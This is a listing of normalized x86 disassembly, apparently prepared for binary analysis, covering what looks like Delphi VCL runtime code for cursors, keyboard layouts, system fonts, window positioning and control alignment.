mov eax ebx
call sub_449088
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_448d84
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_448d84
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_448d84
push eax
call RedrawWindow
sub_4604e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_45b19c
mov dl 0x5
mov eax ebx
call sub_45d008
mov dl 0x1
mov eax ebx
call sub_447960
mov dl 0x3
mov eax ebx
call sub_45d304
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_46054c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_460623
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_447820
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44768c
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_441a64
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4424c4
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404184
mov eax [ ebp - 0xc ]
call sub_404354
push eax
mov eax [ ebp - 0xc ]
call sub_404554
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_4424d4
mov eax [ ebp - 0xc ]
call sub_404354
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46062a
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov dl 0x1
mov eax esi
call sub_45c688
mov edx [ ebp - 0xc ]
mov eax esi
call sub_442580
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4046e0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_460650
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_445ab4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_45bdac
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_445a78
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403540
inc ebp
dec edi
jne r-xdata
sub_46069c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_447820
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_4606c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448028
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_4606f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45ea58
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_448d84
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_447820
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_448d84
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_448d84
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_447834
or ecx 0xffffffff
mov dl 0x1
call sub_442c10
pop esi
pop ebx
retn
sub_460788
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_448498
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_443750
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_441ef0
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403540
sub_4607e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4608a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_4424c4
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404184
mov eax [ ebp - 0x4 ]
call sub_404354
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_4424d4
mov eax [ ebp - 0x4 ]
call sub_404354
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442580
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4608ad
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_45c688
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4046e0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_4608cc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_448218
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_447820
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_447834
mov dl [ ebx + 0x57 ]
call sub_442470
inc edi
dec esi
jne r-xdata
sub_460970
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4609a0
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_4609d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419db0
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460d74
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_460d80
mov eax ebx
call sub_460d8c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_45d1a8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d000
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_46123c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4610d0
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4610d0
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4610d0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_460b28
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403344
mov eax [ ebp + 0x88 ]
call sub_403344
mov eax [ ebp + 0x84 ]
call sub_403344
mov eax [ ebp + 0x54 ]
call sub_403344
mov eax [ ebp + 0x50 ]
call sub_403344
mov eax [ ebp + 0x4c ]
call sub_403344
mov eax [ ebp + 0x30 ]
call sub_403344
mov eax [ ebp + 0x34 ]
call sub_403344
mov eax [ ebp + 0x7c ]
call sub_403344
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403344
mov eax ebp
call sub_460de8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419dfc
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4143bc
call sub_403344
inc edi
dec esi
jne r-xdata
sub_460ca0
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_460cec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414210
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414210
mov eax [ rw-data ]
call sub_463b08
sub_460d24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414500
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414500
mov eax [ rw-data ]
call sub_463b08
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_44a35c
sub_460d8c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_460e8c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_460de8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_402714
mov ebx esi
test ebx ebx
jne r-xdata
sub_460e44
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
xor esi esi
jmp r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jne r-xdata
mov esi ebx
mov ebx [ ebx ]
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx ]
mov [ edi + 0x5c ] eax
jmp r-xdata
mov edx 0xc
mov eax ebx
call sub_402714
sub_460e8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026f4
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_460eb4
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46105f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461066
lea eax [ ebp - 0x260 ]
call sub_404094
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404094
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415fa0
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_409014
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_44db04
test al al
je r-xdata
xor eax eax
push ebp
push sub_46101b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404304
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404304
sub_4610d0
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_463978
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46372c
mov dl 0x1
mov eax [ rw-data ]
call sub_46372c
sub_46113c
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_461164
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46113c
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406ca4
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406c04
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4611f4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
cmp esi 0xffffffff
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_460e44
test edi edi
je r-xdata
mov [ ebx + 0x60 ] edi
jmp r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x60 ] eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_460e8c
sub_46123c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_461381
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46372c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41d390
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41d390
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41d474
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41d390
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41d390
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41d390
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46372c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41d1d4
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41d1d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461388
cmp [ rw-data ] 0x0
je r-xdata
sub_4613c0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_461420
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46155c ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_4615d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_460c98
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4143bc
mov dl [ ebp - 0x1 ]
call sub_461420
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_460c84
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
